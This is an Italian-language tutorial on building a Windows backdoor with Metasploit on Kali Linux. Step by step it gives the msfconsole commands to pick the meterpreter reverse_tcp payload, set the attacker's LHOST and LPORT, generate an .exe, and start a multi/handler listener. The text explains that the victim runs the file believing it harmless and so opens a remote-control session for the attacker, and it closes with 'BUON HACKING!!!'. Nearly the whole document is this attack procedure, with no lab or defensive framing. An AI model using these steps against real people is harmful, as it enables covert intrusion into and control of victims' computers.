*********COME CREARE UNA BACKDOOR CON METASPLOIT**********

Versione di Kali Linux usata: 2.0

Un backdoor è un malware che crea una "porta" tramite la quale 
è possibile ottenere il controllo da remoto di una macchina vittima
in quanto si stabilisce una connessione inversa, ovvero la connessione
la instaura la vittima (molto probabilmente senza saperlo) avviando la backdoor
credendo che sia un programma/file innocuo e si apre così una sessione fra
il PC dell'attaccante e della vittima.

Il programma utilizzato è METASPLOIT!

1)Avviare metasploit dal terminale digitando "msfconsole" e premere invio.
  Dopo qualche istante inizierà il processo di avvio del programma.

2)Una volta che il programma si è avviato possiamo iniziare a creare la nostra backdoor
andando a scegliere la tipologia di attacco.
Digitare nel programma: "use windows/meterpreter/reverse_tcp" e premere Invio.

3)Ora dobbiamo impostare quale host può rimanere in ascolto della vittima e su quale porta
Per scoprire il proprio indirizzo IP (indirizzo logico) a livello locale basta aprire un secondo
terminale e digitare "ifconfig" così da ottenere informazioni in merito alla scheda di rete e quindi l'IP

4)Imposto l'indirizzo IP della macchina attaccante con "set LHOST  XXX.XXX.XXX.XXX" e premere Invio

5)Imposto la porta dell'indirizzo IP che sarà dedicata all'attacco, l'importante è non usare porte di uso
comune come la porta 80 di Internet e altre porte di solito utilizzo.

6)Ora che abbiamo deciso che attacco utilizzare e abbiamo impostato IP e porta allora genero il file .exe
Digito: "generate -t exe -f nomechevuoi.exe" e premi Invio

Attendere qualche istante che Metasploit lavora per creare il file eseguibile che deve ricevere la vittima
Il file che ha generato lo trovi nella directory "Home"(dove ci sono le cartelle Documenti,Musica ecc)

7)Ora che abbiamo creato il file dobbiamo preoccuparci di impostare Metasploit come strumento di "ascolto" 
sull'indirizzo che abbiamo stabilito(nostra macchina dalla quale attacchiamo,tramite IP) e su quale porta.
Usciamo da questa fase di creazione della backdoor digitando "back" e premendo invio.

8) Digitare "use exploit/multi/handler" 

9)Ora devo dire a Metasploit quale tecnica deve aspettarsi quindi imposto il PAYLOAD
Digito: "set PAYLOAD windows/meterpreter/reverse_tcp" e digito Invio

10)Imposto nuovamente l'indirizzo digitando "set LHOST XXX.XXX.XXX.XXX" premere INVIO

11)Imposto nuovamente la porta digitando "set LPORT stessaportadiprima" premere INVIO

12)Digitare "exploit" e premere Invio

Ora metasploit è in attesa che si instauiri una connessione...ovviamente ciò avverà se la vittima 
avvierà il file correttamente e se LHOST e LPORT sono stati impostati correttamente entrambe le volte.

Una volta instaurata la connessione inversa basta digitare "help" per avere una lista completa di tutti i comandi che si possono utilizzare.

BUON HACKING!!! :)
